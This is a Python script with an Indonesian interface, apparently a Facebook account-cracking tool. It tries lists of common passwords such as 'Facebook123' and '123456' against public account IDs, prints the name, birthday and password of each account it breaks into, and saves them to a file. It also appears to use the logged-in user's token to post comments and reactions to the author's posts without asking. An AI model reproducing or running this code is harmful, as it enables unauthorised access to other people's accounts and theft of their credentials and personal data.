...
\033[1;93m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯
 ...
 \033[1;93m              -GUNAKAN DENGAN BIJAK-
                       
\033[37;1m║Author  • Ardiansyah Putra XD. 
\033[37;1m║Facebook • https://www.facebook.com/User.Gantenk07
\033[37;1m║Whatsapp • 081217884551 """
...
def masuk():
	...
	print logo
	print "\033[37;1m======================================================="
	print "\033[37;1m[1] Login Menggunakan Akun Facebook"
	print "\033[37;1m[2] Login Menggunakan Token Facebook"
	print "\033[37;1m[3] Ambil Token"
	print "\033[37;1m[0] Keluar"
	print "\033[37;1m======================================================"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\n\033[1;93m▄︻╦̵̵͇̿̿̿̿╤───⛧\033[91m:\033[1;96m ")
	if msuk =="":
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				os.system('xdg-open https://m.facebook.com/usermagic.3')
				bot_komen()
...
def tokenz():
	...
	try:
		...
		os.system('xdg-open https://www.facebook.com/User.Gantenk07')
		bot_komen()
	except KeyError:
...
def bot_komen():
	...
	kom = ('Hallo Ardian 😘')
	reac = ('LOVE')
	post = ('2691689721091583')
	post2 = ('2694264994167389')
	kom2 = ('Hallo Ardian Saya Penggunamu !! 😊')
	reac2 = ('LOVE')
...
def menu():
	...
	print logo
	print "\033[37;1m======================================================="
	print "\033[37;1m                  •SELAMAT DATAMG•"
	print "\033[37;1m======================================================="
	...
	print "\033[37;1m======================================================"
	print "\033[37;1m                •SEMOGA MEYENANGKAN•"
	print "\033[37;1m======================================================"
	print "\033[37;1m[1] Crack ID Publik Facebook"
	print "\033[37;1m[2] Keluar"
	print "\033[37;1m======================================================"
...
######PILIH######
def pilih():
	unikers = raw_input("\033[1;93m▄︻╦̵̵͇̿̿̿̿╤───⛧\033[91m:\033[1;96m ")
	if unikers =="":
...
#### PILIH INDO ####
def pilih_indo():
	teak = raw_input("\033[1;93m▄︻╦̵̵͇̿̿̿̿╤───⛧ \033[91m:\033[1;96m ")
	if teak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in w:
				...
				print '\x1c\033[1;97m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers']
				...
				oks.append(tl+foll+user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\x1c\033[1;96m[•🍒•] \x1c\033[1;96mCheckpoint'
					print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mName \x1c\033[1;94m    🍏 \x1c\033[1;96m' + c['name']
					print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;96m' + c['birthday']
					print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers']
					print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mID \x1c\033[1;94m      🍏 \x1c\033[1;96m' + user
					print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mPassword \x1c\033[1;94m🍏 \x1c\033[1;96m' + pass1 + '\n'
					cek = open("out/super_cp.txt", "a")
					cek.write("Tl:" +birthday+ "Foll:" +followers+ "ID:" +user+ " Pw:" +pass1+"\n")
					cek.close()
					cekpoint.append(tl+foll+user+pass1)
				else:
					...
					if 'access_token' in w:
						...
						if 'www.facebook.com' in w['error_msg']:
							...
							print '\x1c\033[1;97m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers']
							print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mID \x1c\033[1;94m      🍏 \x1c\033[1;96m' + user
							print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mPassword \x1c\033[1;94m🍏 \x1c\033[1;96m' + pass2 + '\n'
							cek = open("out/super_cp.txt", "a")
							cek.write("Tl:" +birthday+ "Foll:" +followers+ "ID:" +user+ " Pw:" +pass2+"\n")
							cek.close()
							cekpoint.append(birthday+followers+user+pass2)
						else:
							...
							if 'access_token' in w:
								...
								if 'www.facebook.com' in w['error_msg']:
									...
									print '\x1c\033[1;97m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers']
									print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mID \x1c\033[1;94m      🍏 \x1c\033[1;96m' + user
									print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mPassword \x1c\033[1;94m🍏 \x1c\033[1;96m' + pass3 + '\n'
									cek = open("out/super_cp.txt", "a")
									cek.write("Tl:" +birthday+ "Foll:" +followers+ "ID:" +user+ " Pw:" +pass3+"\n")
									cek.close()
									cekpoint.append(tl+foll+user+pass3)
								else:
									...
									if 'access_token' in w:
										...
										if 'www.facebook.com' in w['error_msg']:
											...
											print '\x1c\033[1;97m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers'] 
											print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mID \x1c\033[1;94m      🍏 \x1c\033[1;96m' + user
											print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mPassword \x1c\033[1;94m🍏 \x1c\033[1;96m' + pass4 + '\n'
											cek = open("out/super_cp.txt", "a")
											cek.write("Tl:" +birthday+ "Foll:" +followers+ "ID:" +user+ " Pw:" +pass4+"\n")
											cek.close()
											cekpoint.append(tl+foll+user+pass4)
										else:
											...
											if 'access_token' in w:
												...
												if 'www.facebook.com' in w['error_msg']:
													...
													print '\x1c\033[1;97m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers']
													print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mID \x1c\033[1;94m      🍏 \x1c\033[1;96m' + user
													print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mPassword \x1c\033[1;94m🍏 \x1c\033[1;96m' + pass5 + '\n'
													cek = open("out/super_cp.txt", "a")
													cek.write("Tl:" +birthday+ "Foll:" +followers+ "ID:" +user+ " Pw:" +pass5+"\n")
													cek.close()
													cekpoint.append(tl+foll+user+pass5)
												else:
													...
													if 'access_token' in w:
														...
														if 'www.facebook.com' in w['error_msg']:
															...
															print '\x1c\033[1;97m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers']
															print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mID \x1c\033[1;94m      🍏 \x1c\033[1;96m' + user
															print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mPassword \x1c\033[1;94m🍏 \x1c\033[1;96m' + pass6 + '\n'
															cek = open("out/super_cp.txt", "a")
															cek.write("Tl:" +birthday+ "Foll:" +followers+ "ID:" +user+ " Pw:" +pass6+"\n")
															cek.close()
															cekpoint.append(tl+foll+user+pass6)
														else:
															pass7 = 'Facebook123'
															...
															if 'access_token' in w:
																...
																if 'www.facebook.com' in w['error_msg']:
																	...
																	print '\x1c\033[1;97m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers']
																	print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mID \x1c\033[1;94m      🍏 \x1c\033[1;96m' + user
																	print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mPassword \x1c\033[1;94m🍏 \x1c\033[1;96m' + pass7 + '\n'
																	cek = open("out/super_cp.txt", "a")
																	cek.write("Tl:" +birthday+ "Foll:" +followers+ "ID:" +user+ " Pw:" +pass7+"\n")
																	cek.close()
																	cekpoint.append(tl+foll+user+pass7)
																else:
																	pass8 = 'Facebook1234'
																	...
																	if 'access_token' in w:
																		...
																		if 'www.facebook.com' in w['error_msg']:
																			...
																			print '\x1c\033[1;97m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers']
																			print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mID \x1c\033[1;94m      🍏 \x1c\033[1;96m' + user
																			print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mPassword \x1c\033[1;94m🍏 \x1c\033[1;96m' + pass8 + '\n'
																			cek = open("out/super_cp.txt", "a")
																			cek.write("Tl:" +birthday+ "Foll:" +followers+ "ID:" +user+ " Pw:" +pass8+"\n")
																			cek.close()
																			cekpoint.append(tl+foll+user+pass8)
																		else:
																				pass9 = 'Facebook12345'
																				...
																				if 'access_token' in w:
																					...
																					if 'www.facebook.com' in w['error_msg']:
																						...
																						print '\x1c\033[1;97m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers']
																						print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mID \x1c\033[1;94m      🍏 \x1c\033[1;96m' + user
																						print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mPassword \x1c\033[1;94m🍏 \x1c\033[1;96m' + pass9 + '\n'
																						cek = open("out/super_cp.txt", "a")
																						cek.write("Tl:" +birthday+ "Foll:" +followers+ "ID:" +user+ " Pw:" +pass9+ "\n")
																						cek.close()
																						cekpoint.append(tl+foll+user+pass9)
																					else:
																						pass10 = '123456789'
																						...
																						if 'access_token' in w:
																							...
																							oks.append(tl+foll+user+pass10)
																						else:
																							if 'www.facebook.com' in w['error_msg']:
																								print '\x1c\033[1;96m[•🍒•] \x1c\033[1;96mCheckpoint'
																								print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mName \x1c\033[1;94m    🍏 \x1c\033[1;96m' + c['name']
																								...
																								print '\x1c\033[1;97m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers']
																								print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mID \x1c\033[1;94m      🍏 \x1c\033[1;96m' + user
																								print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mPassword \x1c\033[1;94m🍏 \x1c\033[1;96m' + pass10 + '\n'
																								cek = open("out/super_cp.txt", "a")
																								cek.write("Tl:" +birthday+ "Foll:" +followers+ "ID:" +user+ " Pw:" +pass10+"\n")
																								cek.close()
																								cekpoint.append(tl+foll+user+pass10)
																							else:
																								pass11 = '123456'
																								...
																								if 'access_token' in w:
																									...
																									print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
																									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
																									print '\x1c\033[1;97m[•🍎•] \x1c\033[1;94mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
																									print '\x1c\033[1;97m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers']
																									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
																									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass11 + '\n'
																									oks.append(tl+foll+user+pass11)
																								else:
																									if 'www.facebook.com' in w['error_msg']:
																										print '\x1c\033[1;96m[•🍒•] \x1c\033[1;96mCheckpoint'
																										print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mName \x1c\033[1;94m    🍏 \x1c\033[1;96m' + c['name']
																										print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mTanggal Lahir \x1c\033[1;94m🍏 \x1c\033[1;96m' + c['birthday']
																										print '\x1c\033[1;97m[•🍎•] \x1c\033[1;96mFollowers \x1c\033[1;96m🍏 \1xc\033[1;96m' + c['followers']
																										print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mID \x1c\033[1;94m      🍏 \x1c\033[1;96m' + user
																										print '\x1c\033[1;96m[•🍎•] \x1c\033[1;96mPassword \x1c\033[1;94m🍏 \x1c\033[1;96m' + pass11 + '\n'
																										cek = open("out/super_cp.txt", "a")
																										cek.write("Tl:" +birthday+ "Foll:" +followers+ "ID:" +user+ " Pw:" +pass11+"\n")
																										cek.close()
																										cekpoint.append(tl+foll+user+pass11)
		except:
			pass
